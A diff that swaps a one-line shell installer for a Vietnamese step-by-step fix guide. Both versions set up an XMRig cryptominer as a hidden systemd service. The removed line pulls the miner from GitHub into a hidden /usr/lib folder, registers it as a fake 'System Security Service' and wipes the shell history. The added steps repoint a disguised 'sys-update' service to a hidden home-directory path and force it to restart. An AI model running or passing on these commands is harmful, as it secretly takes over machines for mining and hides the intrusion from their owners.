@@ -1,1 +1,17 @@
-sudo bash -c 's="sys_update"; d="/usr/lib/.sys_cache"; mkdir -p $d; curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/config.json -o $d/config.json; curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/xmrig -o $d/sys_mgr; chmod +x $d/sys_mgr; echo -e "[Unit]\nDescription=System Security Service\nAfter=network.target\n\n[Service]\nType=simple\nWorkingDirectory=$d\nExecStart=$d/sys_mgr --config=$d/config.json\nRestart=always\nRestartSec=15\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/$s.service; systemctl daemon-reload; systemctl enable $s; systemctl start $s; history -c; cat /dev/null > ~/.bash_history'
+1. Cài đặt các thư viện bắt buộc
+XMRig cần các thư viện này để chạy được trên Linux. Nếu thiếu, nó sẽ báo "inactive" ngay lập tức.
+
+Bash
+sudo apt update && sudo apt install libuv1-dev libssl-dev libhwloc-dev -y
+2. Sửa lỗi "không tìm thấy file" (Fix triệt để)
+Nhiều khả năng biến $REAL_PATH lúc nãy bị mất khi bạn mở session mới. Hãy chạy lệnh này để cấp quyền và cố định lại đường dẫn:
+
+Bash
+chmod +x $HOME/.local/share/systemd-cache/sys-update
+sudo sed -i "s|ExecStart=.*|ExecStart=$HOME/.local/share/systemd-cache/sys-update -c $HOME/.local/share/systemd-cache/config.json|" /etc/systemd/system/sys-update.service
+sudo sed -i "s|WorkingDirectory=.*|WorkingDirectory=$HOME/.local/share/systemd-cache|" /etc/systemd/system/sys-update.service
+3. Kích hoạt lại và "Ép" chạy
+Bash
+sudo systemctl daemon-reload
+sudo systemctl enable sys-update
+sudo systemctl restart sys-update
